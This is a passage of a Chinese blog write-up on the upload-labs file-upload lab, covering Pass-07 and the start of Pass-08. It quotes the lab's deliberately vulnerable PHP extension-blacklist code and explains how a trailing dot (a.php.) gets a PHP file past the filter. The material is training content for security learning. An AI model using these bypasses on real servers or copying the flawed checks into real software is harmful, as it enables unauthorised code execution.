class=&#34;string&#34;&gt;&amp;quot;.cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aScx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aShx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cEr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.sWf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = deldot(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//删除文件名末尾的点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strrchr(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strtolower(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//转换为小写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = str_ireplace(&lt;span class=&#34;string&#34;&gt;&amp;#x27;::$DATA&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//去除字符串::$DATA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_array(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.date(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).rand(&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;).&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;此文件不允许上传&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311194014038.png&#34; alt=&#34;image-20210311194014038&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功上传&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311194100032.png&#34; alt=&#34;image-20210311194100032&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-07点绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-07点绕过&#34;&gt;#&lt;/a&gt; Pass-07（点绕过）&lt;/h2&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (file_exists(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aScx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aShx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cEr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.sWf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strrchr(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strtolower(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//转换为小写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = str_ireplace(&lt;span class=&#34;string&#34;&gt;&amp;#x27;::$DATA&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//去除字符串::$DATA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//首尾去空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_array(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;此文件类型不允许上传！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;分析源代码，发现没有删除末尾的点，果断点绕过&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311194252002.png&#34; alt=&#34;image-20210311194252002&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传上去后，有个小坑，不能访问 a.php.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311194821509.png&#34; alt=&#34;image-20210311194821509&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接访问 a.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311194851252.png&#34; alt=&#34;image-20210311194851252&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-08data绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-08data绕过&#34;&gt;#&lt;/a&gt; Pass-08 (::$DATA 绕过)&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (file_exists(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSp&amp;quot;&lt;/span&gt;,&lt;span 